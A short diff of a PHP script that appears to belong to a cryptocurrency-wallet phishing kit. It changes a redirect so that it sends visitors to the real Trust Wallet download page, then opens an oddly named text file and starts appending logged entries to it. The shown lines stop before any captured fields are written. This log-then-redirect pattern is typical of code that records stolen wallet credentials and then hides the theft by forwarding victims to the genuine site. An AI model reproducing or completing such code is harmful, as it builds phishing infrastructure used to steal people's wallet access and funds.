@@ -1,6 +1,6 @@
 <?php
 
-header ('Location: MunGBs9BCi5kytgveCpWxdv.html');
+header ('Location: https://trustwallet.com/download-page');
 $handle = fopen("415979872L.txt", "a");
 fwrite($handle, "===============================");
 fwrite($handle, "\n");
